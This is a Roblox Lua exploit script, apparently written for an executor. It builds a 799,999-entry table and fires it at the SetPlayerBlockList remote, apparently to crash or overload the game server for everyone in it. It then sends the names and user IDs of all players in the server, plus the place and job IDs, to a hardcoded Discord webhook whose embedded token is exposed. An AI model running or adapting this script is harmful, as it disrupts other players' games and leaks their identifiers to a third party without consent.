local localPlayer = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")

-- 1. Snapshot all players in the server right before execution
local playersList = {}
local playerCount = 0

for _, p in ipairs(game.Players:GetPlayers()) do
    playerCount = playerCount + 1
    table.insert(playersList, p.Name .. " (`" .. p.UserId .. "`)")
end

local playersString = table.concat(playersList, ", ")
if #playersString > 1024 then
    playersString = string.sub(playersString, 1, 1021) .. "..."
elseif #playersString == 0 then
    playersString = "None"
end

-- 2. Fetch the executor's avatar thumbnail URL
local thumbSuccess, thumbUrl = pcall(function()
    local api = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. localPlayer.UserId .. "&size=420x420&format=Png&isCircular=false"
    local response = request({
        Url = api,
        Method = "GET"
    })
    local data = HttpService:JSONDecode(response.Body)
    return data.data[1].imageUrl
end)

local avatarThumbnail = (thumbSuccess and thumbUrl) or ""

-- 3. Fire the exploit payload
local remote = game:FindFirstChild("RobloxReplicatedStorage") and game.RobloxReplicatedStorage:FindFirstChild("SetPlayerBlockList")
local entries = 799999
local payload = table.create(entries)

for i = 1, entries do
    payload[i] = { id = i, v = i * 2 }
end

if remote then
    remote:FireServer(payload)
end

-- 4. Send Discord Webhook Logging
local webhookUrl = "https://discord.com/api/webhooks/1560798090385031198/0JtaYi1DOtrpg9xSNKscw3HAalOdJ5mZB5ldcFy5FW4k5F75xUQucpatlGpKXqyzqmBL"

local discordData = {
    ["content"] = "",
    ["embeds"] = {{
        ["title"] = "🚨 Exploit Executed & Server Target Logged",
        ["color"] = 16711680, -- Red
        ["fields"] = {
            {["name"] = "👤 Executor User", ["value"] = localPlayer.Name .. " (`" .. localPlayer.UserId .. "`)", ["inline"] = true},
            {["name"] = "👥 Total Players Affected", ["value"] = tostring(playerCount), ["inline"] = true},
            {["name"] = "📋 Players in Server", ["value"] = playersString, ["inline"] = false},
            {["name"] = "🌍 Place ID", ["value"] = tostring(game.PlaceId), ["inline"] = true},
            {["name"] = "🆔 Job ID", ["value"] = "`" .. tostring(game.JobId) .. "`", ["inline"] = true}
        },
        ["thumbnail"] = {
            ["url"] = avatarThumbnail
        },
        ["timestamp"] = DateTime.now():ToIsoDate()
    }}
}

pcall(function()
    request({
        Url = webhookUrl,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(discordData)
    })
end)
